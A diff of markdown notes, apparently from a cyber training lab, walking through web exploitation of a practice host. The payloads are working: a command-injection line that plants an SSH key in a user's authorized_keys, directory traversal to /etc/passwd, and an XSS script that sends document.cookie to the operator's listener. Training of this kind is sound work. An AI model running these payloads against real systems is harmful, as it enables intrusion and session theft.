@@ -1,8 +1,10 @@
+```
 Scheme of Maneuver:
 >Jump Box: 10.50.37.98
 ->T1:10.100.28.40
 -->T2: 10.100.28.55
---------------------
+```
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 T1
 Hostname: Donovian_MI_websvr
 IP: 10.100.28.40
@@ -24,7 +26,7 @@ Last Known SSH Port: unknown
 PSP: Unknown
 Malware: Unknown
 Action: Conduct approved Web Exploitation techniques to collect intellegence.
---------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 
@@ -65,12 +67,12 @@ nikto v -h 10.100.28.40
 
 	* results of nikto:
 	- Nikto v2.1.5
----------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 + No web server found on 10.100.28.40:80
----------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 + 0 host(s) tested
 
------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 On lin-ops:
 	* Utilize your existing Socket file, put in a new port forward:
@@ -78,18 +80,18 @@ ssh -S /tmp/jump jump -O forward -L 127.0.0.1:1111:10.100.28.40:80
 
 	* then open a firefox web-browser on your lin-ops station:
 firefox
----------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 On firefox:
 	* navigate to the device via the Port Forward you added to you Socket File:
 127.0.0.1:1111
--------- /robots.txt: ------------------------------------------------------------
+-------- /robots.txt:--------------------------------------------------------------------------------------------------------------------------------------------------------------------
 	* from your nmap --script http-enum, you enumerated the robots.txt file.
 	* try accessing that file from the web-browser
 http://127.0.0.1:1111/robots.txt
 	* ^ results from /robots.txt:
 User-agent: *
 Disallow: /net_test	
--------- /css -------------------------------------------------------------------
+-------- /css :--------------------------------------------------------------------------------------------------------------------------------------------------------------------
 	* Now look at the other 3 directories that your nmap script found:
 http://127.0.0.1:1111/css
 	* ^ results from /css:
@@ -107,7 +109,7 @@ Index of /css
 [IMG]	ui-icons_004276_256x240.png	2022-03-23 14:33 	4.4K	 
 [IMG]	ui-icons_cc0000_256x240.png	2022-03-23 14:33 	4.4K	 
 [IMG]	ui-icons_ffffff_256x240.png	2022-03-23 14:33 	6.2K	 
--------- /images -----------------------------------------------------------------
+-------- /images :--------------------------------------------------------------------------------------------------------------------------------------------------------------------
 http://127.0.0.1:1111/images
 	* ^ results from /images:
 Index of /images
@@ -117,7 +119,7 @@ Index of /images
 [IMG]	sign.jpeg	2022-03-23 14:33 	10K	 
 Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 1111
 
--------- /uploads ----------------------------------------------------------------
+-------- /uploads :--------------------------------------------------------------------------------------------------------------------------------------------------------------------
 http://127.0.0.1:1111/uploads
 	* ^ results from /uploads:
 Index of /uploads
@@ -134,7 +136,7 @@ Please send me a corrected cert with the right now.
 I took my online training from the following website
 
 10.100.28.55
--------- /net_test -----------------------------------------------------------------
+-------- /net_test :--------------------------------------------------------------------------------------------------------------------------------------------------------------------
 	* check the /net_test directory:
 http://127.0.0.1:1111/net_test
 	* ^ results from the /net_test directory
@@ -192,7 +194,7 @@ billybob:x:1001:1001:you found me watkTNrQG4K8go2baNbj:/home/billybob:/bin/bash
 
 billybob:x:1001:1001:you found me watkTNrQG4K8go2baNbj:/home/billybob:/bin/bash
 
----------------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 	* after you determine the user's home directory, check to see if they have a .ssh directory:
 	* if not, make one:
@@ -209,7 +211,7 @@ cat /home/student/.ssh/id_rsa.pub
 	* /home/billybob/.ssh/authorized_keys
 ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8Ny133z4AEchrClekmxkUtlWrflXcGT8JBygIkkm/Cy7AyZ+U/Sx9YWXrYft9R0GRE/CcJpQfJJhPp0juq+Zc+vYQ73bdOf3duEZjPRTzMiibq8wOpiguT5kJ1jBs6WYqdyuWUO61Re1b1rFAcZsxz26t3S+8+ycYWyYTDthO5ugSXdXmpy9PIHUcb5ogvT0wpIOxLaVyZhlzm6CadP7iklvJAXRXqDeReKU2XdCPpKZb3awt0g4SU7d4Z6od5wR1xGgYwCpAfCpttUnyk5cgVr2YGjvpY4ExkMYSFvZmA2ENXH/3WDpx3I31/DBeGSbIAOqvTUIMGy3kmxQDKp/p student@lin-ops" >> /home/billybob/.ssh/authorized_keys
 
------------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 	on lin-ops
 	* make a new socket, and ssh into the web server, and loggon
 	- sednig private key to encrypt the begging of the conversation. This allows the client to authenticate.
@@ -218,29 +220,32 @@ cat /home/student/.ssh/id_rsa.pub
  
 	* Congrats, you did a ssh  masquerade
 
------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 	on web server: Directory Traversal via HTTP POST/GET methods:
 	http://10.50.28.11/path/pathdemo.php
 
-	* POST method: It cat's so try
+
+ * POST method: It cat's so try
+```
 ../../../../../etc/passwd
-	^ do at least 8 times to be safe
+```
+* do ^ at least 8 times to be safe
 
-	* GET method: interacting with radio buttons, changing the url on the website.
+* GET method: interacting with radio buttons, changing the url on the website.
 	
---------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-	on lin-ops:
-	* make a http server via python3:
+# on lin-ops:
+* make a http server via python3:
+```
 python3 -m http.server
-
-----------------------------------------------
-
-	* then put script on webpage
-	
+```
+* then put script on webpage
+```	
 <script>document.location="http://10.50.27.61:8000/?" + document.cookie;</script>
-			 		^ lin-ops IP
+```
+* lin-ops IP ^^^
 
 					
 10.50.27.61:8000
